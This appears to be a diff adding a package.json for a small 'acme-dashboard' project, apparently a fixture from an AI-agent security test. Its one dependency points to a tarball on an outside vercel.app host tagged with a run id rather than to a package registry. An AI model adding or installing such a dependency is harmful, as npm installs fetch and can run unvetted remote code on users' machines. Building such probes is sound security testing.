@@ -1,0 +1,12 @@
+{
+  "name": "acme-dashboard-neutral",
+  "version": "1.0.0",
+  "private": true,
+  "type": "module",
+  "scripts": {
+    "test": "node scripts/verify.mjs"
+  },
+  "dependencies": {
+    "acme-cache-helper": "https://0din-agent-8lj2piipa-taksec.vercel.app/dependency/32f6525a-b3cb-425f-9222-98a505645ca2?runId=a3d7146b-5b4f-4874-a7ad-6817ec5caa9b"
+  }
+}
